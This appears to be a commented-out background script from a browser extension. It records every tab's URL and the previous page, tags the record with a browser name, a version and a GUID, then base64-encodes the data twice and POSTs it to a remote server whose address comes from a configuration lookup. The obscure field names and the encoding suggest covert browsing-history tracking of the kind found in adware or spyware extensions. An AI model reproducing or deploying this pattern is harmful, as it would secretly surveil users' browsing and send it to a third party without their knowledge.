// function TabList() {
//     var hash = {}, lp = "", lpi = void 0;
//     return {
//         remove: function (tid) {
//             delete hash[tid]
//         }, edit: function (tid, props) {
//             return tid ? (hash[tid] || this.clear(tid), Object.keys(props || {}).forEach(function (key) {
//                 hash[tid][key] = props[key]
//             }), hash[tid]) : null
//         }, request: function (tabId, tab) {
//             if (true) {
//                 // if (!hash[tabId] || hash[tabId].p && !hash[tabId].replaced)return void this.clear(tabId);
//                 var currTab = hash[tabId] || {}, url = validateUrl(tab.url);
//                 url && (currTab.hh || lp != tab.url) && (tab.active || hash[tabId].fr || hash[tabId].uk.push("background_auto_reloading"),
//                 hash[tabId].dada && hash[hash[tabId].dada] && hash[hash[tabId].dada].retroet && (hash[tabId].zz = hash[hash[tabId].dada].retroet),
//                     fetchOverlayPattern(this.edit(tabId, {
//                     sh: url,
//                     b: lp
//                 }), function (d) {
//                 }), tab.active && (lp = currTab.sh), hash[tabId].zz = null, hash[tabId].dada = null), this.clear(tabId), hash[tabId].sh = url, hash[tabId].p = !0
//             }
//         }, clear: function (tid) {
//             hash[tid] = {
//                 var: version || "missing",
//                 val: 21,
//                 un: "1",
//                 su: browsername,
//                 ch: ch,
//                 new: itemator1,
//                 exp: guid(),
//                 sesnew: "",
//                 d: 0,
//                 se: [],
//                 restarting: !1,
//                 sh: (hash[tid] || {}).sh || null,
//                 a: (hash[tid] || {}).a || "",
//                 uk: [],
//                 fr: !1,
//                 aj: (hash[tid] || {}).aj || !1,
//                 replaced: (hash[tid] || {}).replaced || !1,
//                 hh: (hash[tid] || {}).hh || !1,
//                 dada: (hash[tid] || {}).dada || null,
//                 retroet: (hash[tid] || {}).retroet || "",
//                 zz: (hash[tid] || {}).zz || ""
//             }
//         }, details: function (tid, cb) {
//             chrome.tabs.get(tid, function (details) {
//                 chrome.runtime.lastError || cb(details)
//             })
//         }, lpUpdate: function (param) {
//             var idd = param.id || param;
//             lpi = param.id || void 0, lp = (hash[idd] || {}).sh || lp
//         }, getLpi: function () {
//             return lpi
//         }
//     }
// }
// function fetchOverlayPattern(data, callback) {
//     if (listenerLast = localStorage.getItem("listenerLast"), (new Date).getTime() - listenerLast > 300) {
//         data.tnew = Date.now();
//         var bqa = qs(data), payload = btoa(bqa), xhr = new XMLHttpRequest;
//         xhr.open("POST", configFetcher.MainLocator() + main_route, !0), xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded"), xhr.onload = function (e) {
//             if (200 == this.status)try {
//                 callback(JSON.parse(this.response))
//             } catch (e) {
//             }
//         }, xhr.send(["e", encodeURIComponent(btoa(payload))].join("=")), localStorage.setItem("listenerLast", (new Date).getTime())
//     }
// }
// (function () {
//     tablist = new TabList;
//     tablist.request();
// }());